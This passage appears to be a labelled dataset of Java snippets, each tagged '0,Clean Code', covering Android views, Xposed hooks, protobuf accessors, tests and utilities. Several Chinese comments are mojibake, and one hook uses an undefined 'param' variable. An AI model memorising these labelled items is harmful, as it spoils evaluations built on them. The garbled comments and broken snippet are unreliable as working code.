  if (type == TYPE_PIN_DIALOGS || type == TYPE_FOLDERS || type == TYPE_CHATS_IN_FOLDER || type == TYPE_LARGE_FILE || type == TYPE_ACCOUNTS) {
    return true;
  }
  return false;
}
",0,Clean Code
"@Override public void onBackPressed(){
  if (mViewTransition != null && mThumb != null && mViewTransition.getShownViewIndex() == 0 && mThumb.isShown()) {
    int[] location=new int[2];
    mThumb.getLocationInWindow(location);
    if (location[1] + mThumb.getHeight() > 0) {
      setTransitionName();
      finish(new ExitTransaction(mThumb));
      return;
    }
  }
  finish();
}",0,Clean Code
"@Override public void onNext(String token){
  throw new RuntimeException(""Not implemented"");
}
",0,Clean Code
"protected void checkInput(Authorization authorization) throws IllegalInputException {
  if (isEmpty(authorization.getResource()) || isEmpty(authorization.getResourceType()) || isEmpty(authorization.getPrincipal())|| isEmpty(authorization.getPrincipalType())|| authorization.getPermission() < Authorization.PERMISSION_MIN || authorization.getPermission() > Authorization.PERMISSION_MAX)   throw new IllegalInputException();
}
",0,Clean Code
"public float getFloat(Object obj){
  return Platform.UNSAFE.getFloat(obj,fieldOffset);
}
",0,Clean Code
"private void visitPropertyValue(Object value){
  if (isDocument) {
    writeKey();
    writeSeparator();
  }
  writeValue(value.toString());
  if (isDocument) {
    writeLineBreak();
  }
}
",0,Clean Code
"@Test public void test_equals_hash(){
  TokenUsage tu1=new TokenUsage(1,2,3);
  TokenUsage tu2=new TokenUsage(1,2,3);
  assertThat(tu1).isEqualTo(tu1).isNotEqualTo(null).isNotEqualTo(new Object()).isEqualTo(tu2).hasSameHashCodeAs(tu2);
  assertThat(new TokenUsage(null,2,3)).isNotEqualTo(tu1).doesNotHaveSameHashCodeAs(tu1);
  assertThat(new TokenUsage(1,null,3)).isNotEqualTo(tu1).doesNotHaveSameHashCodeAs(tu1);
  assertThat(new TokenUsage(1,2,null)).isNotEqualTo(tu1).doesNotHaveSameHashCodeAs(tu1);
}",0,Clean Code
"@Override public void put(URI uri,Map<String,List<String>> responseHeaders) throws IOException {
  if ((uri == null) || (responseHeaders == null))   return;
  String url=uri.toString();
  for (  String headerKey : responseHeaders.keySet()) {
    if ((headerKey == null) || !(headerKey.equalsIgnoreCase(""Set-Cookie2"") || headerKey.equalsIgnoreCase(""Set-Cookie"")))     continue;
    for (    String headerValue : Objects.requireNonNull(responseHeaders.get(headerKey))) {
      webkitCookieManager.setCookie(url,headerValue);
    }
  }
}",0,Clean Code
"public static void exportPartAsJPEG(final AbstractZyGraph<?,?> zygraph,final String filename) throws IOException {
  Graph2DView view=zygraph.getView();
  final y.io.JPGIOHandler jpg=new y.io.JPGIOHandler();
  jpg.setAntialiasingEnabled(true);
  jpg.setQuality(0.9f);
  exportGraphPartToImageFileFormat(view.getGraph2D(),jpg,filename);
}",0,Clean Code
"int getFakeNum();
",0,Clean Code
"@Specialization protected VmMapping eval(VmMap self){
  var members=EconomicMaps.<Object,ObjectMember>create(self.getLength());
  for (  var entry : self) {
    EconomicMaps.put(members,VmUtils.getKey(entry),VmUtils.createSyntheticObjectEntry("""",VmUtils.getValue(entry)));
  }
  return new VmMapping(VmUtils.createEmptyMaterializedFrame(),BaseModule.getMappingClass().getPrototype(),members);
}
",0,Clean Code
"@Override protected void beforeHookedMethod(MethodHookParam param1) throws Throwable {
  MotionEvent event=(MotionEvent)param1.args[0];
  mGestureDetector.onTouchEvent(event);
  if (!oneFingerPulldownEnabled)   return;
  int mBarState=(int)getObjectField(param.thisObject,""mBarState"");
  if (mBarState != STATUSBAR_MODE_SHADE)   return;
  int w=(int)callMethod(getObjectField(param.thisObject,""mView""),""getMeasuredWidth"");
  float x=event.getX();
  float region=w * statusbarPortion;
  boolean pullDownApproved=(pullDownSide == PULLDOWN_SIDE_RIGHT) ? w - region < x : x < region;
  if (pullDownApproved) {
    callMethod(param.thisObject,""expandWithQs"");
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param1) throws Throwable {
  MotionEvent event=(MotionEvent)param1.args[1];
  mGestureDetector.onTouchEvent(event);
  if (!oneFingerPulldownEnabled)   return;
  if (!(boolean)getObjectField(param.thisObject,""mPulsing"") && !(boolean)getObjectField(param.thisObject,""mDozing"") && (int)getObjectField(param.thisObject,""mBarState"") == STATUSBAR_MODE_SHADE && (boolean)callMethod(param.thisObject,""isFullyCollapsed"")) {
    int w=(int)callMethod(getObjectField(param.thisObject,""mView""),""getMeasuredWidth"");
    float x=event.getX();
    float region=w * statusbarPortion;
    boolean pullDownApproved=(pullDownSide == PULLDOWN_SIDE_RIGHT) ? w - region < x : x < region;
    if (pullDownApproved) {
      callMethod(param.thisObject,""expandWithQs"");
    }
  }
}
@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  if (oneFingerPullupEnabled && STATUSBAR_MODE_KEYGUARD != (int)getObjectField(NotificationPanelViewController,""mBarState"")) {
    pullUpDetector.onTouchEvent((MotionEvent)param.args[0]);
  }
}",0,Clean Code
"private void initView(){
  ivQRCode=findViewById(R.id.ivQRCode);
  tvAddress=findViewById(R.id.tvAddress);
  refreshQRCode();
  findViewById(R.id.pushLocal).setOnClickListener(new View.OnClickListener(){
    @Override public void onClick(    View v){
      try {
        ClipboardManager manager=(ClipboardManager)PushActivity.this.getSystemService(Context.CLIPBOARD_SERVICE);
        if (manager != null) {
          if (manager.hasPrimaryClip() && manager.getPrimaryClip() != null && manager.getPrimaryClip().getItemCount() > 0) {
            ClipData.Item addedText=manager.getPrimaryClip().getItemAt(0);
            Intent newIntent=new Intent(mContext,DetailActivity.class);
            newIntent.putExtra(""id"",addedText.getText().toString().trim());
            newIntent.putExtra(""sourceKey"",""push_agent"");
            newIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            PushActivity.this.startActivity(newIntent);
          }
        }
      }
 catch (      Throwable th) {
      }
    }
  }
);
}",0,Clean Code
"@Override public GitProvenance buildGitProvenance() throws IncompleteGitConfigException {
  if (StringUtils.isBlank(ciRepositoryUrl) || StringUtils.isBlank(ciCommitRefName) || StringUtils.isBlank(ciCommitSha)) {
    throw new IncompleteGitConfigException();
  }
  return new GitProvenance(UUID.randomUUID(),ciRepositoryUrl,ciCommitRefName,ciCommitSha,null,null,emptyList());
}
",0,Clean Code
"/** 
 * Set a hint to the system about whether this fragment's UI is currently visible to the user. This hint defaults to true and is persistent across fragment instance state save and restore. <p>An app may set this to false to indicate that the fragment's UI is scrolled out of visibility or is otherwise not directly visible to the user. This may be used by the system to prioritize operations such as fragment lifecycle updates or loader ordering behavior.</p> <p><strong>Note:</strong> This method may be called outside of the fragment lifecycle. and thus has no ordering guarantees with regard to fragment lifecycle method calls.</p>
 * @param isVisibleToUser true if this fragment's UI is currently visible to the user (default),false if it is not.
 * @deprecated Use {@link FragmentTransaction#setMaxLifecycle(Fragment,Lifecycle.State)}instead.
 */
@Deprecated public void setUserVisibleHint(boolean isVisibleToUser){
  if (!mUserVisibleHint && isVisibleToUser && mState < STARTED && mFragmentManager != null && isAdded() && mIsCreated) {
    mFragmentManager.performPendingDeferredStart(this);
  }
  mUserVisibleHint=isVisibleToUser;
  mDeferStart=mState < STARTED && !isVisibleToUser;
  if (mSavedFragmentState != null) {
    mSavedUserVisibleHint=isVisibleToUser;
  }
}
",0,Clean Code
"public void setTextAndIcon(CharSequence text,int icon){
  setTextAndIcon(text,icon,null);
}
public void setTextAndIcon(CharSequence text,int icon,Drawable iconDrawable){
  textView.setText(text);
  if (icon != 0 || iconDrawable != null || checkView != null) {
    if (iconDrawable != null) {
      imageView.setImageDrawable(iconDrawable);
    }
 else {
      imageView.setImageResource(icon);
    }
    imageView.setVisibility(VISIBLE);
    textView.setPadding(LocaleController.isRTL ? 0 : AndroidUtilities.dp(43),0,LocaleController.isRTL ? AndroidUtilities.dp(43) : 0,0);
  }
 else {
    imageView.setVisibility(INVISIBLE);
    textView.setPadding(0,0,0,0);
  }
}",0,Clean Code
"/** 
 * Sets the value of the internal enum store. This does not do any validity checks, so be sure to use appropriate value constants from  {@link SceneGroupRefreshTypeOuterClass.SceneGroupRefreshType}. Setting an invalid value can cause  {@link SceneGroupRefreshInfo#getGroupRefreshType()} to return null
 * @param value the numeric wire value to set
 * @return this
 */
public SceneGroupRefreshInfo setGroupRefreshTypeValue(final int value){
  bitField0_|=0x00000004;
  groupRefreshType=value;
  return this;
}",0,Clean Code
"@Nullable public Rect intersect(@NotNull Rect other){
  assert other != null : ""Rect::intersect expected other != null"";
  if (_right <= other._left || other._right <= _left || _bottom <= other._top || other._bottom <= _top)   return null;
  return new Rect(Math.max(_left,other._left),Math.max(_top,other._top),Math.min(_right,other._right),Math.min(_bottom,other._bottom));
}
",0,Clean Code
"@Test(expected=ConstraintViolationException.class) public void testGetExecutionStatusNoWorkflowId(){
  try {
    workflowService.getExecutionStatus("""",true);
  }
 catch (  ConstraintViolationException ex) {
    assertEquals(1,ex.getConstraintViolations().size());
    Set<String> messages=getConstraintViolationMessages(ex.getConstraintViolations());
    assertTrue(messages.contains(""WorkflowId cannot be null or empty.""));
    throw ex;
  }
}",0,Clean Code
"public int getBorder(int[][] grid,int x,int y){
  int m=grid.length;
  int n=grid[0].length;
  if (x < 0 || x >= m || y < 0 || y >= n || grid[x][y] == 0) {
    return 1;
  }
  if (grid[x][y] == 2) {
    return 0;
  }
  grid[x][y]=2;
  int res=0;
  for (  int[] foot : footprints) {
    res+=getBorder(grid,x + foot[0],y + foot[1]);
  }
  return res;
}",0,Clean Code
"public HideBubbleHook(Context context){
  if (!SettingHelper.getInstance().isEnable(SettingHelper.beauty_bubble_hide_key))   return;
  final Class<?> messageBubbleView=findClassIfExists(""com.netease.cloudmusic.ui.MessageBubbleView"",context.getClassLoader());
  final Class<?> messageBubbleView_800=findClassIfExists(""com.netease.cloudmusic.theme.ui.MessageBubbleView"",context.getClassLoader());
  findAndHookMethod(View.class,""setVisibility"",int.class,new XC_MethodHook(){
    @Override protected void beforeHookedMethod(    XC_MethodHook.MethodHookParam param){
      if ((messageBubbleView != null && param.thisObject.getClass() == messageBubbleView) || (messageBubbleView_800 != null && param.thisObject.getClass() == messageBubbleView_800)) {
        param.args[0]=View.GONE;
      }
    }
  }
);
}",0,Clean Code
"@Override public Long lpush(String key,String... string){
  try (Jedis jedis=jedisPool.getResource()){
    return jedis.lpush(key,string);
  }
 }
",0,Clean Code
"public void onResume(){
  isPaused=false;
  if (showKeyboardOnResume) {
    showKeyboardOnResume=false;
    editText.requestFocus();
    AndroidUtilities.showKeyboard(editText);
    if (!AndroidUtilities.usingHardwareInput && !keyboardVisible && !AndroidUtilities.isInMultiwindow&& !AndroidUtilities.isTablet()) {
      waitingForKeyboardOpen=true;
      onWaitingForKeyboard();
      AndroidUtilities.cancelRunOnUIThread(openKeyboardRunnable);
      AndroidUtilities.runOnUIThread(openKeyboardRunnable,100);
    }
  }
}",0,Clean Code
"@Override public ModuleFile queryModuleFile(ModuleFile moduleFile){
  return lambdaQuery().eq(ModuleFile::getModuleId,moduleFile.getModuleId()).eq(ModuleFile::getDataId,moduleFile.getDataId()).one();
}
",0,Clean Code
"private int getContainerViewWidth(){
  return getContainerViewWidth(currentEditMode);
}
private int getContainerViewWidth(int mode){
  int width=containerView.getWidth();
  if (mode == 1 || mode == 0 && sendPhotoType == SELECT_TYPE_AVATAR) {
    width-=AndroidUtilities.dp(32);
  }
 else   if (mode != 0 && mode != 3) {
    width-=AndroidUtilities.dp(28);
  }
  return width;
}",0,Clean Code
"/** 
 * 鏍规嵁ID淇敼
 */
void updById(FolderEntity entity);
",0,Clean Code
"private void updateMaskBoundsInternal(Rect b){
  mMaskMatrix.setScale(b.width() / MASK_SIZE,b.height() / MASK_SIZE);
  sMask.transform(mMaskMatrix,mMaskScaleOnly);
  mMaskMatrix.postTranslate(b.left,b.top);
  sMask.transform(mMaskMatrix,mMask);
  if (mLayersBitmap == null || mLayersBitmap.getWidth() != b.width() || mLayersBitmap.getHeight() != b.height()) {
    mLayersBitmap=Bitmap.createBitmap(b.width(),b.height(),Bitmap.Config.ARGB_8888);
  }
  mPaint.setShader(null);
  mTransparentRegion.setEmpty();
  mLayersShader=null;
}",0,Clean Code
"@Override public Yaml.Sequence visitSequence(Yaml.Sequence existingSeq,ExecutionContext ctx){
  Cursor parent=getCursor().getParent();
  if (matcher.matches(parent) && !existingSeq.getMarkers().findFirst(AlreadyReplaced.class).filter(m -> m.getFind().equals(value)).isPresent() && checkExistingSequenceValues(existingSeq,parent)) {
    return appendToSequence(existingSeq,this.value,ctx);
  }
  return super.visitSequence(existingSeq,ctx);
}
",0,Clean Code
"public GGProRecommendGameInfo(GProRecommendGameInfo gProRecommendGameInfo){
  this.mInfo=gProRecommendGameInfo;
}
",0,Clean Code
"/** 
 * <code>optional bool is_protected = 12;</code>
 * @return this
 */
public Equipment clearIsProtected(){
  bitField0_&=~0x00000100;
  isProtected=false;
  return this;
}",0,Clean Code
"/** 
 * @param value The numeric wire value of the corresponding enum entry.
 * @return The enum associated with the given numeric wire value, or null if unknown.
 */
public static BattleEndReason forNumber(int value){
  return BattleEndReasonConverter.INSTANCE.forNumber(value);
}
@Override public final BattleEndReason forNumber(final int value){
  if (value >= 0 && value < lookup.length) {
    return lookup[value];
  }
  return null;
}",0,Clean Code
"private boolean transferLoadArray(StoreArray store,LoadArray load){
  Var i=store.getArrayAccess().getIndex();
  Var j=load.getArrayAccess().getIndex();
  CPFact storeOut=solver.getOutFact(store);
  CPFact loadOut=solver.getOutFact(load);
  Value vi=storeOut.get(i);
  Value vj=loadOut.get(j);
  if (!vi.isUndef() && !vj.isUndef()) {
    if (vi.isConstant() && vj.isConstant() && vi.equals(vj) || vi.isNAC() || vj.isNAC()) {
      Var x=store.getRValue();
      Value vx=storeOut.get(x);
      Var y=load.getLValue();
      Value oldVy=loadOut.get(y);
      Value newVy=cp.meetValue(oldVy,vx);
      return loadOut.update(y,newVy);
    }
  }
  return false;
}
",0,Clean Code
"@Override public String toString(){
  return ""ComputeSalaryDataBO{"" + ""isSyncInsuranceData="" + isSyncInsuranceData + "", sRecordId=""+ sRecordId+ '}';
}
",0,Clean Code
"@Test public void imageOverrideConnectionProperties(){
  new ApplicationContextRunner().withPropertyValues(""spring.ai.zhipuai.base-url=TEST_BASE_URL"",""spring.ai.zhipuai.api-key=abc123"",""spring.ai.zhipuai.image.base-url=TEST_BASE_URL2"",""spring.ai.zhipuai.image.api-key=456"",""spring.ai.zhipuai.image.options.model=MODEL_XYZ"").withConfiguration(AutoConfigurations.of(SpringAiRetryAutoConfiguration.class,RestClientAutoConfiguration.class,ZhiPuAiAutoConfiguration.class)).run(context -> {
    var imageProperties=context.getBean(ZhiPuAiImageProperties.class);
    var connectionProperties=context.getBean(ZhiPuAiConnectionProperties.class);
    assertThat(connectionProperties.getApiKey()).isEqualTo(""abc123"");
    assertThat(connectionProperties.getBaseUrl()).isEqualTo(""TEST_BASE_URL"");
    assertThat(imageProperties.getApiKey()).isEqualTo(""456"");
    assertThat(imageProperties.getBaseUrl()).isEqualTo(""TEST_BASE_URL2"");
    assertThat(imageProperties.getOptions().getModel()).isEqualTo(""MODEL_XYZ"");
  }
);
}",0,Clean Code
"private int positionInList(int position){
  if (mList != null && mList.size() > paginationSize && canPagination) {
    return position + pageSize * (indexPage - 1);
  }
  return position;
}",0,Clean Code
"private StoryCircle nearest(StoryCircle a,StoryCircle b,StoryCircle c){
  if (c == null || a == null && b == null) {
    return null;
  }
 else   if (a == null || b == null) {
    if (a != null) {
      return a;
    }
    return b;
  }
  float ad=Math.min(Math.abs(a.borderRect.left - c.borderRect.right),Math.abs(a.borderRect.right - c.borderRect.left));
  float bd=Math.min(Math.abs(b.borderRect.left - c.borderRect.right),Math.abs(b.borderRect.right - c.borderRect.left));
  if (ad > bd) {
    return a;
  }
  return b;
}
",0,Clean Code
"private static List<ride> getAllAvailableRidesWithSourceAndDestinationForUser(user u,String Source,String Destination){
  List<ride> specifiedRide=new ArrayList<ride>();
  for (  ride r : allOffers) {
    if (!(u.getIds().equals(r.getRideUser().getIds())) && r.getOrigin().equals(Source) && r.getDestination().equals(Destination)&& r.getAvailable_seats() != 0) {
      specifiedRide.add(r);
    }
  }
  return specifiedRide;
}",0,Clean Code
"protected void appendUnpinVideoFromSidebarButton(){
  if (!mIsPinToSidebarEnabled) {
    return;
  }
  Video video=getVideo();
  if (video == null || (!video.hasPlaylist() && !video.hasReloadPageKey() && !video.hasChannel())) {
    return;
  }
  getDialogPresenter().appendSingleButton(UiOptionItem.from(getContext().getString(R.string.unpin_from_sidebar),optionItem -> {
    togglePinToSidebar(video);
    closeDialog();
  }
));
}
",0,Clean Code
"@Override protected void doFilterInternal(HttpServletRequest request,HttpServletResponse response,FilterChain filterChain) throws ServletException, IOException {
  if (request.getRequestURL().toString().contains(""swagger"")) {
    filterChain.doFilter(request,response);
    return;
  }
  String token=request.getHeader(TOKEN);
  if (permissionEnable && token != null && !request.getMethod().equalsIgnoreCase(""options"")) {
    String userName=jwtTokenTool.getUserName(token);
    if (Objects.equals(superAdmin,userName)) {
      filterChain.doFilter(request,response);
      return;
    }
    String resourceName=request.getServletPath();
    String method=request.getMethod();
    log.info(""PermissionFilter: {}"",resourceName);
    Resources resources=resourcesService.search(resourceName,method);
    if (resources == null) {
      response.setContentType(""text/plain;charset=UTF-8"");
      JSONObject re=(JSONObject)JSONObject.toJSON(process(request,new RespModel(RespEnum.RESOURCE_NOT_FOUND)));
      response.getWriter().write(re.toJSONString());
      return;
    }
    if (resources.getWhite() == UrlType.WHITE || resources.getNeedAuth() == UrlType.WHITE) {
      filterChain.doFilter(request,response);
      return;
    }
    if (!rolesServices.checkUserHasResourceAuthorize(userName,resourceName,method)) {
      response.setContentType(""text/plain;charset=UTF-8"");
      JSONObject re=(JSONObject)JSONObject.toJSON(process(request,new RespModel(RespEnum.PERMISSION_DENIED)));
      response.getWriter().write(re.toJSONString());
      return;
    }
  }
  filterChain.doFilter(request,response);
}",0,Clean Code
"public boolean find(TreeNode A,TreeNode B){
  if (A == null && B == null) {
    return true;
  }
  if (A == null) {
    return false;
  }
  if (B == null) {
    return true;
  }
  if (A.val == B.val) {
    return find(A.left,B.left) && find(A.right,B.right);
  }
 else {
    return false;
  }
}
public void find(TreeNode p){
  if (p == null) {
    return;
  }
  if (p.left == null && p.right == null) {
    return;
  }
  TreeNode t=p.left;
  p.left=p.right;
  p.right=t;
  find(p.left);
  find(p.right);
}
public boolean find(TreeNode p,TreeNode q){
  if (p == null && q == null) {
    return true;
  }
  if (p == null || q == null) {
    return false;
  }
  if (p.val == q.val) {
    return find(p.left,q.right) && find(p.right,q.left);
  }
 else {
    return false;
  }
}
public boolean find(int[] postorder,int start,int end){
  if (start >= end) {
    return true;
  }
  int i=start, j=end - 1;
  while (i < end && postorder[i] < postorder[end]) {
    i++;
  }
  while (j > start && postorder[j] > postorder[end]) {
    j--;
  }
  if (i < j) {
    return false;
  }
  return find(postorder,start,i - 1) && find(postorder,j + 1,end - 1);
}
public void find(List<Integer> list,TreeNode root,int target,int sum){
  if (root == null) {
    return;
  }
  target+=root.val;
  list.add(root.val);
  if (target == sum && root.left == null && root.right == null) {
    result.add(new LinkedList<>(list));
  }
 else {
    find(list,root.left,target,sum);
    find(list,root.right,target,sum);
  }
  list.remove(list.size() - 1);
}
public int find(TreeNode root,int num){
  if (root == null) {
    return num;
  }
  return Math.max(find(root.left,num + 1),find(root.right,num + 1));
}",0,Clean Code
"public boolean hasSpoilers(){
  if (NekoConfig.showSpoilersDirectly.Bool())   return false;
  if (hasCaptionLayout() && !captionSpoilers.isEmpty() || replyTextLayout != null && !replySpoilers.isEmpty()) {
    return true;
  }
  if (getMessageObject() != null && getMessageObject().textLayoutBlocks != null) {
    for (    MessageObject.TextLayoutBlock bl : getMessageObject().textLayoutBlocks) {
      if (!bl.spoilers.isEmpty()) {
        return true;
      }
    }
  }
  return false;
}
",0,Clean Code
"/** 
 * <code>optional uint32 game_mode_type = 6;</code>
 * @return this
 */
public RogueDialogueEvent clearGameModeType(){
  bitField0_&=~0x00000004;
  gameModeType=0;
  return this;
}",0,Clean Code
"/** 
 * 鏇存柊搴楅摵
 * @param result
 */
@Override protected void processUpdateInternal(CanalBinLogResult<ShopDetailBO> result){
  ShopDetailBO beforeData=result.getBeforeData();
  if (Objects.isNull(beforeData.getShopName()) && StrUtil.isBlank(beforeData.getShopLogo()) && !Objects.equals(beforeData.getShopStatus(),StatusEnum.ENABLE.value())) {
    return;
  }
  ShopDetailBO afterData=result.getAfterData();
  EsProductBO esProductBO=new EsProductBO();
  if (StrUtil.isNotBlank(beforeData.getShopName())) {
    esProductBO.setShopName(afterData.getShopName());
  }
  if (Objects.nonNull(beforeData.getShopLogo())) {
    esProductBO.setShopImg(afterData.getShopLogo());
  }
  if (Objects.nonNull(beforeData.getShopStatus()) && Objects.equals(beforeData.getShopId(),StatusEnum.ENABLE.value())) {
    esProductBO.setSpuStatus(StatusEnum.DISABLE.value());
  }
  ServerResponseEntity<List<Long>> responseData=productFeignClient.getSpuIdsByShopId(afterData.getShopId());
  productUpdateManager.esUpdateSpuBySpuIds(responseData.getData(),esProductBO);
}
",0,Clean Code
"@Override public V put(K key,V value){
  array[offset++]=key;
  array[offset++]=value;
  return null;
}
",0,Clean Code
"public void commitCurrentOffset(){
  if (streamSplitReadTask != null && streamSplitReadTask.offsetContext != null) {
    PostgresOffsetContext postgresOffsetContext=streamSplitReadTask.offsetContext;
    Long commitLsn=(Long)postgresOffsetContext.getOffset().get(PostgresOffsetContext.LAST_COMMIT_LSN_KEY);
    if (commitLsn != null && (lastCommitLsn == null || Lsn.valueOf(commitLsn).compareTo(Lsn.valueOf(lastCommitLsn)) > 0)) {
      lastCommitLsn=commitLsn;
      Map<String,Object> offsets=new HashMap<>();
      offsets.put(PostgresOffsetContext.LAST_COMMIT_LSN_KEY,lastCommitLsn);
      LOG.debug(""Committing offset {} for {}"",Lsn.valueOf(lastCommitLsn),streamSplitReadTask.streamSplit);
      streamSplitReadTask.commitOffset(offsets);
    }
  }
}",0,Clean Code
"public void removeAssignJobs(Set<Long> jobIds){
  if (jobs == null || jobIds == null || jobIds.isEmpty()) {
    return;
  }
  jobs.removeAll(jobIds);
}
",0,Clean Code
"boolean isOk(final ResponseEntity<SrsOtpRedemptionResponse> response){
  if (isEmpty(response) || isEmpty(response.getStatusCode()) || !response.getStatusCode().is2xxSuccessful()) {
    return false;
  }
  if (isEmpty(response.getBody())) {
    logger.error(""SRS OTP response body is null, but status code is: {}!?! - '{}'"",response.getStatusCode(),response);
    return true;
  }
  return OtpState.VALID.equals(response.getBody().getState());
}",0,Clean Code
"@Override public IStateAction<CNodeDraggedLeftState<NodeType,EdgeType>> createNodeDraggedLeftAction(){
  return new CombinedNodeDraggedLeftAction<>();
}
",0,Clean Code
"@Override public void onChange(Job job){
  sendObject(job);
  if (job.hasState(SUCCEEDED) || job.hasState(FAILED) || job.hasState(DELETED)) {
    close();
  }
}
",0,Clean Code
"public NettyClient getContainProxy(String proxyip){
  if (proxyip == null) {
    return null;
  }
  for (  NettyClient tmpClient : clientList) {
    if (tmpClient != null && tmpClient.getServerIP() != null && tmpClient.getServerIP().equals(proxyip)) {
      return tmpClient;
    }
  }
  return null;
}
",0,Clean Code
"@Override public Map<Long,KafkaController> getKafkaControllersFromDB(List<Long> clusterPhyIdList,boolean notIncludeNotAlive){
  List<KafkaControllerPO> poList=kafkaControllerDAO.listAllLatest();
  Map<Long,KafkaController> controllerMap=new HashMap<>();
  for (  KafkaControllerPO po : poList) {
    if ((po.getBrokerId().equals(Constant.INVALID_CODE) && notIncludeNotAlive) || !clusterPhyIdList.contains(po.getClusterPhyId())) {
      continue;
    }
    KafkaController kafkaController=new KafkaController();
    kafkaController.setClusterPhyId(po.getClusterPhyId());
    kafkaController.setBrokerId(po.getBrokerId());
    kafkaController.setTimestamp(po.getTimestamp());
    controllerMap.put(po.getClusterPhyId(),kafkaController);
  }
  return controllerMap;
}
",0,Clean Code
"public static String sendPost(final String urlString,final String encodedData) throws IOException {
  final URL url=new URL(urlString);
  final URLConnection conn=url.openConnection();
  conn.setDoOutput(true);
  final OutputStreamWriter wr=new OutputStreamWriter(conn.getOutputStream());
  try {
    wr.write(encodedData);
    wr.flush();
  }
  finally {
    wr.close();
  }
  final BufferedReader rd=new BufferedReader(new InputStreamReader(conn.getInputStream()));
  final StringBuilder ret=new StringBuilder();
  String line;
  try {
    while ((line=rd.readLine()) != null) {
      ret.append(line);
    }
  }
  finally {
    rd.close();
  }
  return ret.toString();
}
",0,Clean Code
"private ItemCost(){
}
",0,Clean Code
"/** 
 * <code>optional uint32 unk_int = 15;</code>
 * @return the unkInt
 */
public int getUnkInt(){
  return unkInt;
}",0,Clean Code
"private boolean hasSecondaryEffect(){
  if (this.levels >= 4 && this.primaryPower != this.secondaryPower && this.secondaryPower != null) {
    return true;
  }
  return false;
}",0,Clean Code
"/** 
 * <code>optional uint32 new_room_id = 11;</code>
 * @return whether the newRoomId field is set
 */
public boolean hasNewRoomId(){
  return (bitField0_ & 0x00000080) != 0;
}",0,Clean Code
"/** 
 * @return Status of the task
 */
public Status getStatus(){
  return status;
}
",0,Clean Code
"@Inject(method=""renderEndSky"",at=@At(value=""INVOKE"",target=""Lnet/minecraft/client/render/Tessellator;draw()V"")) private void onRenderEndSkyDraw(MatrixStack matrices,CallbackInfo info){
  Ambience ambience=Modules.get().get(Ambience.class);
  if (ambience.isActive() && ambience.endSky.get() && ambience.customSkyColor.get()) {
    Color customEndSkyColor=ambience.skyColor();
    Tessellator tessellator=Tessellator.getInstance();
    BufferBuilder bufferBuilder=tessellator.getBuffer();
    Matrix4f matrix4f=matrices.peek().getPositionMatrix();
    bufferBuilder.clear();
    bufferBuilder.vertex(matrix4f,-100.0F,-100.0F,-100.0F).texture(0.0F,0.0F).color(customEndSkyColor.r,customEndSkyColor.g,customEndSkyColor.b,255).next();
    bufferBuilder.vertex(matrix4f,-100.0F,-100.0F,100.0F).texture(0.0F,16.0F).color(customEndSkyColor.r,customEndSkyColor.g,customEndSkyColor.b,255).next();
    bufferBuilder.vertex(matrix4f,100.0F,-100.0F,100.0F).texture(16.0F,16.0F).color(customEndSkyColor.r,customEndSkyColor.g,customEndSkyColor.b,255).next();
    bufferBuilder.vertex(matrix4f,100.0F,-100.0F,-100.0F).texture(16.0F,0.0F).color(customEndSkyColor.r,customEndSkyColor.g,customEndSkyColor.b,255).next();
  }
}",0,Clean Code
"@Override public SimpleHrmEmployeeVO transferSimpleEmp(HrmEmployee employee){
  SimpleHrmEmployeeVO simpleHrmEmployeeVO=new SimpleHrmEmployeeVO();
  simpleHrmEmployeeVO.setEmployeeId(employee.getEmployeeId());
  simpleHrmEmployeeVO.setEmployeeName(employee.getEmployeeName());
  int status=1;
  if (employee.getIsDel() == 1) {
    status=3;
  }
  if (employee.getIsDel() == 0 && employee.getEntryStatus().equals(EmployeeEntryStatus.IN.getValue())) {
    status=1;
  }
  if (employee.getIsDel() == 0 && (employee.getEntryStatus().equals(EmployeeEntryStatus.ALREADY_LEAVE.getValue()) || employee.getEntryStatus().equals(EmployeeEntryStatus.TO_IN.getValue()))) {
    status=2;
  }
  simpleHrmEmployeeVO.setStatus(status);
  simpleHrmEmployeeVO.setPost(employee.getPost());
  if (null != employee.getDeptId()) {
    DeptVO deptVO=hrmDeptService.queryById(employee.getDeptId());
    if (deptVO != null) {
      simpleHrmEmployeeVO.setDeptName(deptVO.getName());
    }
  }
  return simpleHrmEmployeeVO;
}",0,Clean Code
"default void visitSet(Set<?> value){
  visitDefault(value);
}
",0,Clean Code
"/** 
 * @return a new empty instance of {@code EnterRogueMapRoomScRsp}
 */
public static EnterRogueMapRoomScRsp newInstance(){
  return new EnterRogueMapRoomScRsp();
}
",0,Clean Code
"public void setButtonPressed(boolean pressed){
  if (messageObject == null || !messageObject.isGiveaway() || selectorDrawable == null) {
    return;
  }
  if (pressed) {
    selectorDrawable.setCallback(new Drawable.Callback(){
      @Override public void invalidateDrawable(      @NonNull Drawable who){
        parentView.invalidate();
      }
      @Override public void scheduleDrawable(      @NonNull Drawable who,      @NonNull Runnable what,      long when){
        parentView.invalidate();
      }
      @Override public void unscheduleDrawable(      @NonNull Drawable who,      @NonNull Runnable what){
        parentView.invalidate();
      }
    }
);
    selectorDrawable.setState(pressedState);
    parentView.invalidate();
  }
 else {
    selectorDrawable.setState(StateSet.NOTHING);
    parentView.invalidate();
  }
}
",0,Clean Code
"/** 
 * Removes given config option from the configuration.
 * @param configOption config option to remove
 * @param < T > Type of the config option
 * @return true is config has been removed, false otherwise
 */
public <T>boolean remove(ConfigOption<T> configOption){
synchronized (this.confData) {
    final BiFunction<String,Boolean,Optional<Boolean>> applier=(key,canBePrefixMap) -> {
      if (canBePrefixMap && removePrefixMap(this.confData,key) || this.confData.remove(key) != null) {
        return Optional.of(true);
      }
      return Optional.empty();
    }
;
    return applyWithOption(configOption,applier).orElse(false);
  }
}
",0,Clean Code
"/** 
 * 聽 聽 聽* 鎴柇杈撳嚭鏃ュ織 聽 聽 聽 聽 聽 聽* @param msg 聽 聽 聽
 */
public static void eLength(String tag,String msg){
  if (isDebug) {
    if (tag == null || tag.length() == 0 || msg == null || msg.length() == 0)     return;
    int segmentSize=3 * 1024;
    long length=msg.length();
    if (length <= segmentSize) {
      Log.e(tag,msg);
    }
 else {
      while (msg.length() > segmentSize) {
        String logContent=msg.substring(0,segmentSize);
        msg=msg.replace(logContent,"""");
        Log.e(tag,logContent);
      }
      Log.e(tag,msg);
    }
  }
}",0,Clean Code
"public PreferencesDialog(){
  this(null);
}
public PreferencesDialog(PreferenceGroup initialGroup){
  this(initialGroup,false);
}
